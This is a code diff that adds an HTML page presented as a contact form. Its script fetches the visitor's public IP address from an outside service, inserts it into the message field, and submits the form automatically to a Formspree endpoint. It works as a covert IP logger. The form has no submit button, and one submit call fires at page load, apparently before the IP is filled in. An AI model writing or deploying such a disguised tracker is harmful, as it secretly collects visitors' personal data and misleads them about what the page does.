@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Contact Form</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+<body>
+<form action="https://formspree.io/f/xbjnwzqr" method="post">
+    <input type="email" id="email" name="_replyto" placeholder="gmail@gmail.com"><br>
+    <textarea id="message" name="message" rows="1" cols="20"></textarea><br>
+</form>
+<span id="ip"></span>
+    <script>
+                $("form").submit();
+
+
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('message').value = data.ip;
+        })
+        .catch(error => console.error('Error:', error));
+
+        $(document).ready(function(){
+            // Function to check if all fields are filled
+            function allFieldsFilled() {
+                var email = $("#email").val();
+                var message = $("#message").val();
+                return email !== '' && message !== '';
+            }
+
+            // Function to submit the form to Formspree
+            function submitForm() {
+                $("form").submit();
+            }
+
+            // Automatically submit form to Formspree when all fields are filled
+            $("input, textarea").on('input', function() {
+                if (allFieldsFilled()) {
+                    submitForm();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
